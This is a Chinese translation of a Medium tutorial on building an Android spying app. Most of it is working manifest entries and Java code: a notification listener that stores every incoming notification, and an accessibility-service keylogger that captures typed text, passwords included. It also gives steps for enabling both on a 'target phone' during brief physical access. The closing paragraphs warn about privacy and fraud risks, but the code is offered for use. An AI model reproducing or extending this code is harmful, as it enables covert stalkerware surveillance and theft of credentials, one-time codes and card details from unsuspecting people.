# 如何在 Android 中搭建一个间谍 app？

> 原文：<https://medium.com/nerd-for-tech/how-to-build-a-spying-app-in-android-4051bf8feee9?source=collection_archive---------1----------------------->

![](img/bf75a270c9d0d0d1912816f88d847d54.png)

一天，当我漫不经心地浏览网页时，我看到了一个应用程序的广告，该应用程序旨在供父母用来监控他们十几岁孩子的电话使用情况。深入挖掘一下，我在 android play 商店发现了一大堆应用程序，它们提供监控(间谍！！)收费服务。我对这些应用程序的工作原理感到好奇，并开始阅读相关资料。我发现，建立一个是多么容易，从隐私的角度来看又是多么可怕。

间谍软件有两个基本部分，一个是监控进来的东西(比如电话/信息/提醒)，另一个是捕捉出去的所有东西(比如你输入的任何东西)。还有其他方面，如录制音频/视频，截图等，我可能会在下一篇文章中介绍。为了开始第一部分，我们首先在应用程序中实现 NotificationListener 服务。这是 android 文档对这项服务的描述

> 一种服务，当发布或删除新的通知，或者它们的等级发生变化时，接收来自系统的调用。

为此，我们在 AndroidManifest.xml 文件中添加一个服务定义，如下所示

```
<service
    android:name=".NotificationListener"
    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
    <intent-filter>
        <action android:name="android.service.notification.NotificationListenerService" />
    </intent-filter>
</service>
```

接下来创建一个扩展 NotificationListenerService 的类 NotificationListener。

```
public class NotificationListener extends NotificationListenerService {
    private SQLiteDatabaseHandler db;

    public String foregroundApp="";
    private Timer timer;
    public String mAccountName;
    public NotificationListener() {
        db = new SQLiteDatabaseHandler(this);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Bundle extras = sbn.getNotification().extras;
        if ((sbn.getNotification().flags & Notification.*FLAG_GROUP_SUMMARY*) != 0) {
            Log.*d*("error", "Ignore the notification FLAG_GROUP_SUMMARY");
            return;
        }
        String title="";
        String text="";
        try {
            if (extras.get("android.title") instanceof String) {
                title = extras.getString("android.title");
            }
            if (extras.get("android.title") instanceof SpannableString) {
                title = extras.get("android.title").toString();
            }
            text = extras.getCharSequence("android.text").toString();
        }
        catch(Exception e)
        {
            Log.*i*("exception",e.getMessage());
        }

        String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.*getDefault*()).format(new Date());
        Notifs thisNotif=new Notifs();
        thisNotif.setMessage(text);
        thisNotif.setTitle(title);
        thisNotif.setPackageName(sbn.getPackageName());
        thisNotif.setTime(date);
        thisNotif.setInum(sbn.getId());
        db.addNotification(thisNotif);
        super.onNotificationPosted(sbn);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
    }

    @Override
    public void onListenerConnected() {
        //Start Webserver
      startTimer();
        super.onListenerConnected();
    }

    @Override
    public void onListenerDisconnected() {

        stopTimer();
        super.onListenerDisconnected();
    }
```

上面的示例代码除了进行基本处理之外，还将通知存储在本地数据库中。每次手机收到新通知时，系统都会触发“onNotificationPosted”功能的回调。这里你可以做一些基本的处理来避免重复。

现在剩下的唯一事情是授予我们的应用程序访问该服务的权限。这是一个手动过程，需要您实际启用应用程序的权限。在目标手机上，你需要打开设置>应用与通知>高级>特殊应用访问>通知访问。您会看到您的应用程序列在屏幕上。你只需要点击它，并允许访问你的应用程序接收通知。或者，您可以通过这种方式触发打开此权限页面

```
Intent intent = new Intent(Settings.*ACTION_NOTIFICATION_LISTENER_SETTINGS*);
   startActivity(intent);
```

就是这样。现在，您可以捕获手机上收到的所有通知。

下一步是捕捉一切是在手机上输入的聊天信息，网址，密码！等等。为此，我们需要实现 AccessibilityService。同样，为了做到这一点，我们首先向清单文件中添加一个服务定义。

```
<service android:name=".KeyListener"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibilityservice" />

</service>
```

我们还需要添加一个 xml 文件，其中包含与可访问性服务相关的元数据，它告诉系统我们想要访问的事件类型，在本例中是 typeViewTextChanged。

```
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes = "typeViewTextChanged"
    android:accessibilityFeedbackType="feedbackSpoken"
    android:notificationTimeout="100"
    >

</accessibility-service>
```

接下来创建一个名为 KeyListener 的类，它扩展了 AccessibilityService。

```
public class KeyListener extends AccessibilityService {
    public String foregroundApp="";
    public String lastMsg="";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        switch(eventType) {
            case AccessibilityEvent.*TYPE_VIEW_TEXT_CHANGED*:
                break;
        }

        String currApp=event.getPackageName().toString();
        if((foregroundApp.equals(currApp))||foregroundApp.length()==0)
        {
            lastMsg=event.getText().toString();
            Log.*d*("Pre",currApp + "  :  "+lastMsg);

        }
        else
        {
            Log.*d*("Final ",foregroundApp+" :  "+lastMsg);

        }
        foregroundApp=currApp;
        lastMsg=event.getText().toString();
    }

    @Override
    public void onInterrupt() {

    }
```

每当用户在他的 android 设备上输入任何东西，系统都会向我们发送一个通知，告诉我们在特定的 textview 中输入了什么。该通知还包含输入该信息的应用程序的详细信息。

最后要做的是授予我们的应用程序访问该服务的权限。您可以手动完成此操作，方法是转到“设置”>“辅助功能”,选择您的应用程序并授予其权限。或者，您可以按如下程序打开此屏幕

```
Intent intent = new Intent(Settings.*ACTION_ACCESSIBILITY_SETTINGS*);
startActivity(intent);
```

就是这样，现在你可以捕捉你的手机上输入的一切。

如上所述，实现这样的事情是极其容易的。要完成这一切所需要的是一个服务器组件，该应用程序将张贴所有信息。Android 提供了一定程度的保护，它迫使用户手动授予访问这些服务的权限，但即使是临时访问手机的人也可以安装间谍应用程序并启用它。

这也有很大的隐私问题，使用这些应用程序来监控他们所爱的人的人没有意识到提供这些功能的应用程序可以访问非常私人的数据。这也可以包括通过短信或电子邮件收到的 OTP。此外，信用卡号码/详细信息以及在手机上输入的任何内容都很容易被这些应用程序提供商获取。冒这个险，安装这样的应用程序，让自己暴露在财务和身份欺诈面前，真的值得吗？